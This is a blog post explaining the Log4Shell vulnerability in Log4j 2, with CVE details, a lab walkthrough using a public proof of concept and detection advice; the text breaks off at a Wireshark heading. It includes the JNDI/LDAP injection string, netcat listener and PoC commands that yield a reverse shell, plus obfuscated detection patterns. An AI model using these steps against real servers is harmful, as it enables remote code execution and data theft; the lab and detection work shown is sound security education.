<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="prefer-datetime-locale" content="en-us"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Log4Shell - What is it, How does it Work &amp; How to Detect it" /><meta property="og:locale" content="en" /><meta name="description" content="Introduction: In this write up I will be discussing what Log4J is, what CVEs are out there now, how the Log4Shell vulnerability works and how to detect the activity.  The goal of this write up is to share valuable info on how Log4Shell works and why it was so severe." /><meta property="og:description" content="Introduction: In this write up I will be discussing what Log4J is, what CVEs are out there now, how the Log4Shell vulnerability works and how to detect the activity.  The goal of this write up is to share valuable info on how Log4Shell works and why it was so severe." /><link rel="canonical" href="https://dunnski.github.io/posts/log4shell_what_is_it_how_does_it_work_how_to_detect_it-copy/" /><meta property="og:url" content="https://dunnski.github.io/posts/log4shell_what_is_it_how_does_it_work_how_to_detect_it-copy/" /><meta property="og:site_name" content="JT_Dunnski" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-02-19T07:00:00-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Log4Shell - What is it, How does it Work &amp; How to Detect it" /><meta name="twitter:site" content="@jt_dunnski" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-02-19T07:00:00-05:00","datePublished":"2022-02-19T07:00:00-05:00","description":"Introduction: In this write up I will be discussing what Log4J is, what CVEs are out there now, how the Log4Shell vulnerability works and how to detect the activity.  The goal of this write up is to share valuable info on how Log4Shell works and why it was so severe.","headline":"Log4Shell - What is it, How does it Work &amp; How to Detect it","mainEntityOfPage":{"@type":"WebPage","@id":"https://dunnski.github.io/posts/log4shell_what_is_it_how_does_it_work_how_to_detect_it-copy/"},"url":"https://dunnski.github.io/posts/log4shell_what_is_it_how_does_it_work_how_to_detect_it-copy/"}</script><title>Log4Shell - What is it, How does it Work & How to Detect it | JT_Dunnski</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="JT_Dunnski"><meta name="application-name" content="JT_Dunnski"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" https://res.cloudinary.com/dunnski/image/upload/v1653506922/Blog_Assets/Author_images/dunnski_sp1mrh.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">JT_Dunnski</a></div><div class="site-subtitle font-italic">Blog focused on Cyber Security and Reverse Engineering</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://www.linkedin.com/in/josh-dunn12" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://twitter.com/jt_dunnski" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://github.com/dunnski" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['jt_dunnski','proton.me'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Log4Shell - What is it, How does it Work & How to Detect it</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="/assets/img/blog/log4shell_what_is_it_images//03-Malicious_Log4j_request.png" class="preview-img bg" alt="Preview Image" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>Log4Shell - What is it, How does it Work & How to Detect it</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/jt_dunnski">Joshua</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1645272000" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-02-19 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1953 words"> <em>10 min</em> read</span></div></div></div><div class="post-content"><h2 id="introduction"><span class="mr-2">Introduction:</span><a href="#introduction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>In this write up I will be discussing what Log4J is, what CVEs are out there now, how the Log4Shell vulnerability works and how to detect the activity.  The goal of this write up is to share valuable info on how Log4Shell works and why it was so severe.</p><h2 id="cves-published"><span class="mr-2">CVEs Published:</span><a href="#cves-published" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><style type="text/css"> .tg {border-collapse:collapse;border-color:#aabcfe;border-spacing:0;} .tg td{background-color:#e8edff;border-color:#aabcfe;border-style:solid;border-width:0px;color:#669; font-family:Arial, sans-serif;font-size:14px;overflow:hidden;padding:10px 5px;word-break:normal;} .tg th{background-color:#b9c9fe;border-color:#aabcfe;border-style:solid;border-width:0px;color:#039; font-family:Arial, sans-serif;font-size:14px;font-weight:normal;overflow:hidden;padding:10px 5px;word-break:normal;} .tg .tg-phtq{background-color:#D2E4FC;border-color:inherit;text-align:left;vertical-align:top} .tg .tg-c3ow{border-color:inherit;text-align:center;vertical-align:top} .tg .tg-0pky{border-color:inherit;text-align:left;vertical-align:top}</style><table class="tg"><thead><tr><th class="tg-c3ow">Vulnerability:<th class="tg-c3ow">Details:<th class="tg-c3ow">Vulnerable Versions:<th class="tg-c3ow">Patched?<tbody><tr><td class="tg-phtq"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45105" target="_blank" rel="noopener noreferrer">CVE-2021-45105 (latest)</a><td class="tg-phtq">Left the door open for an attacker to initiate a denial-of-service attack by causing an infinite recursion loop on self-referential lookups.<td class="tg-phtq">Log4j2 versions 2.0-alpha1 through 2.16.0 (excluding 2.12.3 and 2.3.1)<td class="tg-phtq">This issue was fixed in Log4j 2.17.0, 2.12.3, and 2.3.1.<tr><td class="tg-0pky"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45046" target="_blank" rel="noopener noreferrer">CVE-2021-45046 (second)</a><td class="tg-0pky">Could allow attackers to craft malicious input data that could cause an information leak or remote code execution.<td class="tg-0pky">Log4j 2.15.0<td class="tg-0pky">Log4j 2.16.0 (Java 8) and 2.12.2 (Java 7) fix this issue by removing support for message lookup patterns and disabling JNDI functionality by default.<tr><td class="tg-phtq"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228" target="_blank" rel="noopener noreferrer">CVE-2021-44228 (original)</a><td class="tg-phtq">Possible for an attacker to execute random code using the message lookup functionality.<td class="tg-phtq">Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)<td class="tg-phtq">2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed.</table><h2 id="what-is-log4j"><span class="mr-2">What is Log4j:</span><a href="#what-is-log4j" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Log4j 2 is a Java-based logging framework and utility that is used to log messages from various software and search for errors.  The log4j library can also execute commands to generate advanced logging information.  Most importantly, to Log4Shell, it can also communicate with other sources such as internal and external directory services using the <strong>Java Naming and Directory Interface or JNDI</strong>.</p><h2 id="what-is-ldap-and-jndi"><span class="mr-2">What is LDAP and JNDI:</span><a href="#what-is-ldap-and-jndi" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><strong>LDAP (Lightweight Directory Access Protocol)</strong> is an open and cross-platform protocol that is used for directory service authentication. It provides the communication language that the application uses to communicate with other directory services. These directory services store various types of important information like user accounts details, passwords, computer accounts, etc which are shared with other devices on the network.</p><p><strong>JNDI (Java Naming and Directory Interface)</strong> is an application programming interface (API) that provides naming and directory functionality to applications written using Java Programming Language.</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/blog/log4shell_what_is_it_images//01_jndi_diagram.jpeg" alt="" width="700" height="400" class="shadow" data-proofer-ignore> <em>Figure 1: JNDI Diagram</em></p><h2 id="how-does-jndi-and-ldap-interact"><span class="mr-2">How does JNDI and LDAP Interact:</span><a href="#how-does-jndi-and-ldap-interact" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>JNDI provides a standard API for interacting with name and directory services using a <strong>service provider interface (SPI)</strong> as shown in the diagram above. JNDI provides Java applications and objects with an interface to access directory services like LDAP. More information can be found on <a href="https://docs.oracle.com/javase/7/docs/technotes/guides/jndi/jndi-ldap-gl.html">Oracle’s JNDI Implementor Guidelines for LDAP Service Providers</a>.</p><h2 id="log4shellcve-2021-44228"><span class="mr-2">Log4Shell(CVE-2021-44228):</span><a href="#log4shellcve-2021-44228" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Log4Shell is an RCE (remote code execution) vulnerability meaning that the vulnerability allows an attacker to execute code remotely on a target system.  This is possible due to the Log4j 2 library being able to communicate with external sources. An attacker can easily send malicious commands to a server running a vulnerable version of Log4j 2,  which can be used to remotely upload malicious payloads to the server.</p><p>More specifically, Log4Shell targets Log4j 2’s Java Naming and Directory Interface or JNDI API. In vulnerable versions of Log4j 2, the JNDI API does not protect against attacker-controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP or Lightweight Directory Access Protocol servers when message lookup substitution is enabled.</p><h2 id="normal-log4j-lookup"><span class="mr-2">Normal Log4j Lookup:</span><a href="#normal-log4j-lookup" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Log4j provides the ability to perform various kinds of lookups. Lookups allow a Java application to add values to the log4j configuration at various places.  These lookups can include mapping, system properties, and most importantly to Log4Shell, JNDI lookups.</p><p>As seen in <strong>Figure 1</strong>, Log4j uses the JNDI API to interact with various naming and directory services such as: LDAP, DNS(Domain Name Service), NIS (Network Information Service), etc. If this functionality is being used you should see this line of code somewhere: <strong>${jndi:logging/context-name}</strong>. “:logging” specifies that the logging protocol is being targeted by JNDI, but other protocols (such as LDAP, RMI, DNS, etc) can be substituted as seen later in this document.  Below is a diagram of a normal Log4j Lookup.</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/blog/log4shell_what_is_it_images//02_Normal_log4j_request.png" alt="" width="700" height="400" class="shadow" data-proofer-ignore> <em>Figure 2: Normal Log4J Request</em></p><h2 id="malicious-log4j-lookup"><span class="mr-2">Malicious Log4j Lookup:</span><a href="#malicious-log4j-lookup" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>An attacker who can control log messages or log messages parameters can execute arbitrary code on the vulnerable server loaded from LDAP servers when message lookup substitution is enabled. As a result, an attacker can craft a special request that would make the utility remotely downloaded and execute the payload.</p><p>Below is the most common example of it using the combination of JNDI and LDAP: <code class="language-plaintext highlighter-rouge">${jndi:ldap://&lt;host&gt;:&lt;port&gt;/&lt;payload&gt;}</code></p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/blog/log4shell_what_is_it_images//03-Malicious_Log4j_request.png" alt="" width="700" height="400" class="shadow" data-proofer-ignore> <em>Figure 3: Malicious Log4j Request</em></p><h2 id="log4shell-exploitation"><span class="mr-2">Log4Shell Exploitation:</span><a href="#log4shell-exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>There are several Log4Shell POCs on GitHub now. For this particular example, we will be using <a href="https://github.com/kozmer/log4j-shell-poc">Kozmer’s POC</a>. The setup is pretty straightforward. Requirements will be a laptop or Macbook with some type of virtualization software installed, one Kali VM, and one Ubuntu VM with Docker installed.</p><h3 id="setting-up-vulnerable-log4j-2-enabled-server"><span class="mr-2">Setting up Vulnerable Log4j 2 Enabled Server:</span><a href="#setting-up-vulnerable-log4j-2-enabled-server" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Log into your Ubuntu VM and clone the Log4Shell POC:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>git clone https://github.com/kozmer/log4j-shell-poc.git
</pre></table></code></div></div><p>Once you download the POC, Navigate into the folder using:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">cd </span>log4j-shell-poc
</pre></table></code></div></div><p>Next, run:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>pip <span class="nb">install</span> <span class="nt">-r</span> requirements.txt 
</pre></table></code></div></div><p>This installs all the necessary packages needed for the python script to run successfully.</p><p>Now we can build the vulnerable server with Docker:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>docker build <span class="nt">-t</span> log4j-shell-poc
docker run <span class="nt">--network</span> host log4j-shell-poc
</pre></table></code></div></div><p>You may need to run <strong>sudo</strong> in front of both commands depending on the level or permissions your default ubuntu account has. If successful you should see this by navigating to <strong>localhost:8080</strong> in the web browser:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/blog/log4shell_what_is_it_images//04-Testing_Ubuntu_server.png" alt="" width="700" height="400" class="shadow" data-proofer-ignore> <em>Figure 4: Testing to see if Ubuntu Server is Up</em></p><h3 id="setting-up-the-attacker-serverkali-vm"><span class="mr-2">Setting up the Attacker Server(Kali VM):</span><a href="#setting-up-the-attacker-serverkali-vm" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>To start out, let’s switch to root:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">sudo </span>su
</pre></table></code></div></div><p>Now we need to download the same POC from GitHub.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>git clone https://github.com/kozmer/log4j-shell-poc.git
</pre></table></code></div></div><p>Next, we need to download the correct Java version to our Kali VM to successfully exploit the vulnerability. To do that, navigate to: https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</p><p>And download one of the earlier version of Java 8: <strong>java-8u20</strong></p><p>To download the java version you will need to create an account with Oracle.  Once you download the Java version, we need to unzip the file and move the <strong>jdk1.8.0_202</strong> file into the <code class="language-plaintext filepath highlighter-rouge">usr/bin/</code> directory.</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/blog/log4shell_what_is_it_images//05-Moving_vuln_java_library.png" alt="" width="700" height="400" class="shadow" data-proofer-ignore> <em>Figure 5: Moving Java Library to Folder of Interest</em> Now that we have done that, we need to navigate to the <strong>log4j-shell-poc</strong> folder located wherever you unzipped it to.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">cd</span> <span class="o">{</span>path-to-log4j-shell-poc<span class="o">}</span>
</pre></table></code></div></div><p>Next, edit the <strong>poc.py</strong> file stored in that folder. Open the file with</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>gedit poc.py 
</pre></table></code></div></div><p>and change each section that contains <code class="language-plaintext highlighter-rouge">./jdk1.8.2.20/</code> to <code class="language-plaintext highlighter-rouge">/usr/bin/jdk1.8.0_202/</code> there should be <strong>3 spots</strong> where this needs to be changed. &gt;</p><blockquote class="prompt-info"><div><p>Note: if you don’t have gedit installed, Kali will prompt you to install, you can just hit Y to do so.</p></div></blockquote><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/blog/log4shell_what_is_it_images//06-Poc_py_edit.png" alt="" width="700" height="400" class="shadow" data-proofer-ignore> <em>Figure 6: Editing POC.py file</em> If done successfully, your file should look like this:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/blog/log4shell_what_is_it_images//07-What_edited_poc_file_should_look_like.png" alt="" width="700" height="400" class="shadow" data-proofer-ignore> <em>Figure 7: What POC.py file should look like</em> We are now ready to start the attack on the vulnerable Ubuntu server.  First things first, navigate to the Ubuntu machine IP on port 8080 in a browser:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/blog/log4shell_what_is_it_images//08-Testing_Ubuntu_server.png" alt="" width="700" height="400" class="shadow" data-proofer-ignore> <em>Figure *: Checking to see if we can access Ubuntu server from Kali VM</em> Next in a new terminal tab on Kali, start a netcat listening session:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> nc <span class="nt">-lvp</span> 9001
</pre></table></code></div></div><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/blog/log4shell_what_is_it_images//09-image_log4shell.png" alt="" width="700" height="400" class="shadow" data-proofer-ignore> <em>Figure 9: Starting netcat listener</em> Then in the original terminal session(<strong>In the log4j-shell-poc folder</strong>), type:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python poc.py <span class="nt">--user_ip</span> <span class="o">{</span>ip_of_kali_vm<span class="o">}</span> <span class="nt">--webport</span> 8000 <span class="nt">--lport</span> 9001
</pre></table></code></div></div><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/blog/log4shell_what_is_it_images//10-First_launching_poc_py_file.png" alt="" width="700" height="400" class="shadow" data-proofer-ignore> <em>Figure 10: Starting log4shell POC script</em> Now that we have our attacker LDAP server up and running, we can now input our malicious JNDI query into the web server which was provided when we ran the python command above.</p><blockquote class="prompt-tip"><div><p>Look for the JNDI query next to ‘Send me’:</p></div></blockquote><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/blog/log4shell_what_is_it_images//11-Inputing_malicious_JNDI_query.png" alt="" width="700" height="400" class="shadow" data-proofer-ignore> <em>Figure 11: Inputing Malicious JNDI query</em> You should now see this in our POC script terminal session:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/blog/log4shell_what_is_it_images//12-Poc_py_file_running.png" alt="" width="700" height="400" class="shadow" data-proofer-ignore> <em>Figure 12: Showing POC script running successfully</em> In figure 12, we can see that the exploit was successful. The vulnerable web server queried our malicious LDAP server which then served the malicious <code class="language-plaintext highlighter-rouge">Exploit.class</code> file. Within this .class file is a reverse shell payload that will attempt to connect to our netcat listener.</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/blog/log4shell_what_is_it_images//13-Starting_netcat_listener.png" alt="" width="700" height="400" class="shadow" data-proofer-ignore> <em>Figure 13: Showing Reverse Shell via netcat Listener</em> Now that we have a reverse shell on the victim web server we can download additional payloads, exile data, do whatever we want on the system.</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/blog/log4shell_what_is_it_images//14-Showing_ability_to_download_files_from_internet.png" alt="" width="700" height="400" class="shadow" data-proofer-ignore> <em>Figure 14: Showing Ability to Download Files from Internet</em> I’ve also recorded the session to show what it looks like in real time:</p><video width="700" height="400" controls=""> <source src="https://res.cloudinary.com/dunnski/video/upload/v1654003912/Blog_Assets/video_1-executing_log4shell_raolp5.mp4" type="video/mp4" /> </video><p>If you want, you can craft custom payloads to be delivered via this POC and play around with the Log4Shell vulnerability. It’s extremely powerful and there is a lot of different ways to leverage it against a target system.</p><h2 id="how-to-detect-this-activity"><span class="mr-2">How to Detect this Activity:</span><a href="#how-to-detect-this-activity" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Given the severity of this vulnerability, leveraging high fidelity ways of detecting the activity is critical to stopping a potential attack before anything malicious is able to hit a system.  There are two higher fidelity ways to detect this kind of activity:</p><ol><li>Detecting the first step of the exploit, use of <code class="language-plaintext highlighter-rouge">${JNDI:</code> in any incoming field of a packet header or web application form (e.g. username/password fields).  This can be difficult given the level of obfuscation employed by some current botnet campaigns.  Example: <code class="language-plaintext highlighter-rouge">${lower(J)n+lower(D)i</code><li>Detecting the second step of the exploit, when the victim machine attempts to download and execute a <strong>Java .class file</strong> from the attacker’s server. This should be able to be seen both in proxy logs and endpoint detections.</ol><blockquote class="prompt-tip"><div><p>The file may or may not be openly named with the .class extension.</p></div></blockquote><h3 id="suricata"><span class="mr-2">Suricata:</span><a href="#suricata" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>We can use open source IDS/IPS rulesets to see what rules fire when we replay traffic through a tool such as Security Onion.  In the screenshot below, I uploaded a PCAP I capture of attacking our victim Ubuntu machine.  Below, we can see several rules that fire based off of this activity.</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/blog/log4shell_what_is_it_images//15-image_log4shell.png" alt="" width="700" height="400" class="shadow" data-proofer-ignore> <em>Figure 15: Security Onion Screenshot showing Suricata rules triggered by POC</em></p><h3 id="wireshark"><span class="mr-2">Wireshark</span><a href="#wireshark" 